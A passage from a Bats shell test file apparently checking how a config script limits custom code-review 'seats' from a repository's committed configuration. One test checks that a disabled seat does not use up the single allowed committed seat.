  [[ "$(printf '%s\n' "$output" | tail -n 1)" == confirm.1=* ]] || false
  [[ "$stderr" == *"rc-config: reviewer.custom.q2: only one seat from the repo's committed config runs per review"* ]] || false
}

@test "custom: a disabled committed seat does not use up the one committed seat" {
  printf 'reviewers:\n  custom:\n    d:\n      harness: ocr\n      enabled: false\n      provider: ollama\n      model: qwen/x\n    b:\n      harness: ocr\n      provider: ollama\n      model: qwen/y\n    c:\n      harness: ocr\n      provider: ollama\n      model: qwen/z\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom_slots=d,b"
  has_line "reviewer.custom.d.enabled=false"
  has_line "reviewer.custom.b.enabled=true"
  no_line_matching '^reviewer\.custom\.c\.'
  [[ "$stderr" == *"rc-config: reviewer.custom.c: only one seat from the repo's committed config runs per review"* ]] || false
  [[ "$stderr" != *"reviewer.custom.b: only one seat"* ]] || false
}
